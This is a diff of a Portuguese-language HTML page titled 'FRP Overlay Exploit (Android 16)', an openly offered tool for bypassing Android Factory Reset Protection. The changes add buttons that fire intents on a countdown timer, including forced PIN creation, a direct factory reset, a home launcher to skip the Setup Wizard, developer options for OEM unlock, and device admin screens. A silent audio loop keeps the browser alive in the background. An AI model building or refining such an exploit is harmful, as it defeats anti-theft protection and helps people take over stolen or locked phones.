@@ -6,40 +6,59 @@
     <title>FRP Overlay Exploit (Android 16)</title>
     <style>
         body { font-family: -apple-system, sans-serif; padding: 20px; background-color: #121212; color: #ffffff; }
-        .btn { display: block; width: 100%; padding: 15px; margin: 10px 0; background: #007bff; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; }
+        .btn { display: block; width: 100%; padding: 12px; margin: 8px 0; background: #007bff; color: white; border: none; border-radius: 8px; font-size: 15px; font-weight: bold; }
         .btn-danger { background: #dc3545; }
+        .btn-warning { background: #ffc107; color: #000; }
+        .btn-success { background: #28a745; }
         #status { margin-top: 20px; font-weight: bold; color: #ffc107; text-align: center; }
+        h2 { font-size: 20px; margin-bottom: 5px; }
+        p { font-size: 13px; color: #ccc; margin-bottom: 20px; }
     </style>
 </head>
 <body>
     <h2>🚀 BAL Bypass (Overlay)</h2>
-    <p>O Chrome vai usar um "Áudio Fantasma" para não congelar em segundo plano.</p>
+    <p>Áudio fantasma ativo para manter o contexto vivo em background.</p>
 
-    <!-- Áudio silencioso em Base64 para manter o Chrome acordado em segundo plano -->
+    <!-- Áudio silencioso em Base64 para manter a aba acordada em segundo plano -->
     <audio id="wakelock" loop>
         <source src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA" type="audio/wav">
     </audio>
 
-    <!-- Payload 1: Forçar a abertura do Telefone para códigos USSD (*#*#4636#*#*) -->
-    <button class="btn" onclick="iniciarBomba('intent:#Intent;action=android.intent.action.DIAL;end')">
-        1. Injetar Marcador de Telefone (Dialer)
+    <!-- Payload 1: Definir Senha/PIN (Foco principal para sobrescrever o Keystore) -->
+    <button class="btn btn-success" onclick="iniciarBomba('intent:#Intent;action=android.app.action.SET_NEW_PASSWORD;end')">
+        1. Forçar Criação de PIN
     </button>
 
-    <!-- Payload 2: Forçar a tela de Adicionar Administrador (Bypass de UI) -->
+    <!-- Payload 2: Forçar Tela Inicial (Tenta pular o Setup Wizard) -->
+    <button class="btn btn-warning" onclick="iniciarBomba('intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.HOME;end')">
+        2. Forçar Tela Inicial (Launcher)
+    </button>
+
+    <!-- Payload 3: Reset de Fábrica Direto (Ignora UI de configurações) -->
+    <button class="btn btn-danger" onclick="iniciarBomba('intent:#Intent;action=android.intent.action.MASTER_CLEAR;end')">
+        3. Reset de Fábrica Direto
+    </button>
+
+    <!-- Payload 4: Opções de Desenvolvedor (Para tentar OEM Unlock) -->
+    <button class="btn" onclick="iniciarBomba('intent:#Intent;action=android.settings.APPLICATION_DEVELOPMENT_SETTINGS;end')">
+        4. Opções de Desenvolvedor
+    </button>
+
+    <!-- Payload 5: Adicionar Administrador do Dispositivo -->
     <button class="btn" onclick="iniciarBomba('intent:#Intent;action=android.app.action.ADD_DEVICE_ADMIN;end')">
-        2. Injetar Tela de Administrador
+        5. Injetar Tela de Administrador
     </button>
 
-    <!-- Payload 3: Forçar abertura das configurações de Backup do Google diretamente -->
-    <button class="btn btn-danger" onclick="iniciarBomba('intent:#Intent;action=android.intent.action.PRIVACY_SETTINGS;end')">
-        3. Injetar Definições Críticas
+    <!-- Payload 6: Marcador de Telefone (Para códigos USSD) -->
+    <button class="btn" onclick="iniciarBomba('intent:#Intent;action=android.intent.action.DIAL;end')">
+        6. Injetar Marcador de Telefone
     </button>
 
     <div id="status">Aguardando comando...</div>
 
     <script>
         function iniciarBomba(intentUri) {
-            // Toca o áudio invisível para forçar o Android a manter o Chrome rodando no fundo
+            // Toca o áudio invisível para forçar o Android a manter o navegador rodando no fundo
             let audio = document.getElementById('wakelock');
             audio.play().catch(e => console.log("Erro de autoplay ignorado", e));
 
@@ -51,7 +70,7 @@
                 let tempoRestante = Math.ceil((tempoAlvo - Date.now()) / 1000);
 
                 if (tempoRestante > 0) {
-                    statusDiv.innerHTML = `⚠️ VOLTE PARA O SETUP WIZARD AGORA!<br>O Chrome vai injetar a tela em: ${tempoRestante}s`;
+                    statusDiv.innerHTML = `⚠️ VOLTE PARA O SETUP WIZARD AGORA!<br>Injetando tela em: ${tempoRestante}s`;
                 } else {
                     clearInterval(intervalo);
                     statusDiv.innerHTML = "💥 INJETANDO INTENT...";
